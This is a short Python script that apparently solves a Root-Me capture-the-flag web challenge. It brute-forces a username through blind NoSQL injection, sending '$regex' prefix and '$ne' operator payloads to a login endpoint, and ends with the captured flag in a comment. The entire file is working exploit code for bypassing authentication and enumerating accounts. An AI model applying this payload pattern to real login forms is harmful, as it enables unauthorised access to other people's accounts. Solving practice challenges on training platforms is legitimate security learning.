import requests 
import string

s  = string.ascii_letters + string.digits + "{}_@$"
print(s)
url = "http://challenge01.root-me.org/web-serveur/ch38/?login"
username = list("")
# admin, test failed
username.append("f")
while True:
	for i in s:
		payload = {
		           'login[$regex]': '^{}'.format("".join(username)+str(i)), 
		           'pass[$ne]': '1234'
		}
		# print(payload)

		r = requests.get(url, params=payload)
		if("Bad username or bad password !" in r.text):
			pass
		else:
			username.append(i)
			print("".join(username))
			break
		
# flag{nosqli_no_secret_4_you}
